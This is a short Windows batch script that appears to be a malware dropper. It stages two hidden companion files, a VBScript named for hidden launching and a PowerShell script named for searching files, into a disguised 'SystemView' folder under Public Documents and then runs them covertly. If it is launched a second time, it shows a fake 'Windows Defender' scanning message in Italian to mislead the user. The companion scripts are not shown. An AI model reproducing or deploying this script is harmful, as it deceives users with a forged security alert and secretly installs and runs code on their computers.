@echo off
cd /d "%~dp0"
set "DEST_DIR=C:\Users\Public\Documents\SystemView"
set "LOCK_FILE=%temp%\sys_check.lock"

if exist "%LOCK_FILE%" (
    echo MsgBox "L'antivirus sta analizzando il contenuto, attendere la fine del processo.", 48, "Windows Defender" > "%temp%\avviso.vbs"
    wscript.exe "%temp%\avviso.vbs"
    del "%temp%\avviso.vbs"
    exit
)

echo active > "%LOCK_FILE%"
if not exist "%DEST_DIR%" mkdir "%DEST_DIR%"

attrib -h "avvia_nascosto.vbs" >nul 2>&1
attrib -h "cercafiles.ps1" >nul 2>&1

copy /y "avvia_nascosto.vbs" "%DEST_DIR%\" >nul
copy /y "cercafiles.ps1" "%DEST_DIR%\" >nul

attrib +h "avvia_nascosto.vbs" >nul 2>&1
attrib +h "cercafiles.ps1" >nul 2>&1

start "" wscript.exe "%DEST_DIR%\avvia_nascosto.vbs"
exit